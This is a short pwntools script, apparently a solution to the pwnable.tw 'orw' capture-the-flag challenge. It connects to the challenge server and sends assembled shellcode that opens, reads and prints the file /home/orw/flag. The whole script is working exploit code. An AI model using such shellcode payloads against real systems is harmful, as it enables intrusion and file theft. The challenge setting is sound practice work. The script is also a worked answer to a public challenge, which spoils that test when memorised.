#coding=utf-8
from pwn import *

context.binary = './orw'

stack = 0xffffd594
ret = 0xffffd5a8

#r = process('./orw')
r = remote('chall.pwnable.tw', 10001)

payload = shellcraft.pushstr('/home/orw/flag')
payload += shellcraft.open('esp', 0, 0)
payload += shellcraft.read('eax', 'esp', 100)
payload += shellcraft.write(1, 'esp', 100)
payload = asm(payload)

r.recvuntil('shellcode:')
r.sendline(payload)
print r.recvall(1)
